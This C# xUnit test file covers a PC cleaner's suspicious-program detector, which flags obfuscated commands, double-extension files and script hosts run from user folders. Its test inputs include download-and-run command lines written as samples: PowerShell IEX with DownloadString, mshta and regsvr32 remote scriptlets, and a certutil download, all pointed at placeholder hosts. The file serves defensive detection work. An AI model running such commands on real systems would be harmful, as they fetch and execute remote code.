using System.IO;
using PCCleaner.Models;
using PCCleaner.Services.Security;

namespace PCCleaner.Tests;

public sealed class SuspiciousRulesTests
{
    private static readonly IReadOnlyList<string> Roots = [@"C:\Users\me\AppData\Roaming", @"C:\Users\me\AppData\Local\Temp"];

    [Theory]
    [InlineData(@"powershell.exe -nop -w hidden -c ""Start-Sleep 1""")]
    [InlineData(@"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")]
    [InlineData(@"pwsh -EncodedCommand ZQBjAGgAbwAgAGgAaQAgAHQAaABlAHIAZQA=")]
    [InlineData(@"cmd /c powershell IEX (New-Object Net.WebClient).DownloadString('http://x')")]
    [InlineData(@"mshta.exe ""javascript:close()""")]
    [InlineData(@"mshta https://example.com/a.hta")]
    [InlineData(@"regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll")]
    [InlineData(@"certutil.exe -urlcache -split -f http://x/a.exe a.exe")]
    public void ObfuscatedCommands_AreDetected(string command) =>
        Assert.True(SuspiciousRules.HasObfuscatedCommand(command));

    [Theory]
    [InlineData(@"""C:\Program Files\Steam\steam.exe"" -silent")]
    [InlineData(@"C:\Windows\System32\SecurityHealthSystray.exe")]
    [InlineData(@"powershell.exe -File C:\Scripts\backup.ps1")]
    [InlineData(@"""C:\Tools\app.exe"" -e")]
    [InlineData(null)]
    public void NormalCommands_AreNotFlagged(string? command) =>
        Assert.False(SuspiciousRules.HasObfuscatedCommand(command));

    [Theory]
    [InlineData(@"C:\Users\me\Downloads\invoice.pdf.exe", true)]
    [InlineData(@"C:\Users\me\AppData\Local\Temp\photo.JPG.js", true)]
    [InlineData(@"C:\Users\me\Desktop\report.docx.scr", true)]
    [InlineData(@"C:\Program Files\App\app.exe", false)]
    [InlineData(@"C:\Users\me\setup.v2.exe", false)]
    [InlineData(@"C:\Users\me\notes.txt", false)]
    public void DoubleExtension(string path, bool expected) =>
        Assert.Equal(expected, SuspiciousRules.HasDoubleExtension(path));

    [Theory]
    [InlineData(@"C:\Users\me\AppData\Roaming\x\evil.exe", true)]
    [InlineData(@"C:\Users\me\AppData\Local\Temp\a.exe", true)]
    [InlineData(@"C:\Users\me\AppData\Roaming", false)]
    [InlineData(@"C:\Users\me\AppData\Roaming2\a.exe", false)]
    [InlineData(@"C:\Program Files\App\app.exe", false)]
    public void UserWritableLocation(string path, bool expected) =>
        Assert.Equal(expected, SuspiciousRules.IsInUserWritableLocation(path, Roots));

    [Fact]
    public void ScriptHost_RunningFromUserFolder_IsFlagged()
    {
        Assert.True(SuspiciousRules.IsScriptHostFromUserFolder(@"wscript.exe ""C:\Users\me\AppData\Roaming\upd.vbs""", Roots));
        Assert.False(SuspiciousRules.IsScriptHostFromUserFolder(@"wscript.exe ""C:\Scripts\logon.vbs""", Roots));
        Assert.False(SuspiciousRules.IsScriptHostFromUserFolder(@"""C:\Users\me\AppData\Roaming\app\app.exe""", Roots));
    }

    [Fact]
    public void ScriptContent_NeedsTwoIndicators()
    {
        Assert.False(SuspiciousRules.HasObfuscatedScriptContent("$bytes = [Convert]::FromBase64String($data)"));
        Assert.True(SuspiciousRules.HasObfuscatedScriptContent(
            "$c = (New-Object Net.WebClient).DownloadString('http://x'); IEX $c"));
    }

    [Fact]
    public void UnsignedProgramInUserFolder_IsMedium()
    {
        var (reasons, severity) = SuspiciousRules.Evaluate(
            new Evidence(@"C:\Users\me\AppData\Roaming\x\evil.exe", @"C:\Users\me\AppData\Roaming\x\evil.exe", true, false, SignatureState.Unsigned, AmsiVerdict.NotDetected),
            Roots);

        Assert.Equal([SuspiciousRules.UnsignedUserFolder], reasons);
        Assert.Equal(SuspicionSeverity.Medium, severity);
    }

    [Fact]
    public void SignedProgramInUserFolder_IsNotFlagged()
    {
        var (reasons, _) = SuspiciousRules.Evaluate(
            new Evidence(@"C:\Users\me\AppData\Local\Temp\Discord\Update.exe", @"C:\Users\me\AppData\Local\Temp\Discord\Update.exe", true, false, SignatureState.Signed, AmsiVerdict.NotDetected),
            Roots);

        Assert.Empty(reasons);
    }

    [Fact]
    public void MicrosoftSignedFile_SkipsFileRules_ButNotCommandRules()
    {
        var powershell = @"C:\Users\me\AppData\Roaming\copy\powershell.pdf.exe";
        var (reasons, _) = SuspiciousRules.Evaluate(
            new Evidence(powershell, powershell, true, false, SignatureState.SignedByMicrosoft, AmsiVerdict.NotDetected), Roots);
        Assert.Empty(reasons);

        var hidden = powershell + " -w hidden -c calc";
        (reasons, var severity) = SuspiciousRules.Evaluate(
            new Evidence(hidden, powershell, true, false, SignatureState.SignedByMicrosoft, AmsiVerdict.NotDetected), Roots);
        Assert.Equal([SuspiciousRules.ObfuscatedCommand], reasons);
        Assert.Equal(SuspicionSeverity.High, severity);
    }

    [Fact]
    public void MissingTarget_IsLow_AndAmsiDetection_IsHigh()
    {
        var (reasons, severity) = SuspiciousRules.Evaluate(
            new Evidence(@"C:\Gone\old.exe", @"C:\Gone\old.exe", false, false, SignatureState.Unknown, AmsiVerdict.NotDetected), Roots);
        Assert.Equal([SuspiciousRules.MissingTarget], reasons);
        Assert.Equal(SuspicionSeverity.Low, severity);

        // Leftover Windows tasks pointing into the Windows folder aren't actionable.
        var windowsTarget = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "Gone.exe");
        (reasons, _) = SuspiciousRules.Evaluate(
            new Evidence(windowsTarget, windowsTarget, false, false, SignatureState.Unknown, AmsiVerdict.NotDetected), Roots);
        Assert.Empty(reasons);

        (reasons, severity) = SuspiciousRules.Evaluate(
            new Evidence(null, @"C:\Users\me\AppData\Local\Temp\a.ps1", true, true, SignatureState.Unknown, AmsiVerdict.Malware, "Write-Host hi"), Roots);
        Assert.Equal([SuspiciousRules.AmsiDetected], reasons);
        Assert.Equal(SuspicionSeverity.High, severity);
    }
}
